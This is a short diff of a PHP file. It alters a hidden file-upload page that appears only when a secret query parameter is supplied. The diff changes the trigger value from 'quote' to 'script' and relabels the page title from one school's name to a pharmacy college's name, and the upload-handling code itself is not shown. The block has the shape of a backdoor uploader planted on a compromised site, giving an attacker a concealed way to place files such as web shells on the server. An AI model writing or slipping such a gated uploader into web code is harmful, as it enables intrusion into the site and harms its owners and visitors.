@@ -1,11 +1,11 @@
-if (isset($_GET['uploader']) && $_GET['uploader'] == 'quote') {
+if (isset($_GET['uploader']) && $_GET['uploader'] == 'script') {
     echo '
     <!DOCTYPE html>
     <html lang="en">
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Marephaem School Hindustan</title>
+        <title>SRI VENKATESWARA COLLEGE OF PHARMACY</title>
     </head>
     <body>
         <h2>Form Upload File</h2>';
@@ -24,7 +24,7 @@ if (isset($_GET['uploader']) && $_GET['uploader'] == 'quote') {
     }
 
     echo '
-    <form action="' . htmlspecialchars($_SERVER["PHP_SELF"]) . '?uploader=quote" method="post" enctype="multipart/form-data">
+    <form action="' . htmlspecialchars($_SERVER["PHP_SELF"]) . '?uploader=script" method="post" enctype="multipart/form-data">
         <input type="file" name="fileToUpload" id="fileToUpload">
         <input type="submit" value="upload file" name="submit">
     </form>
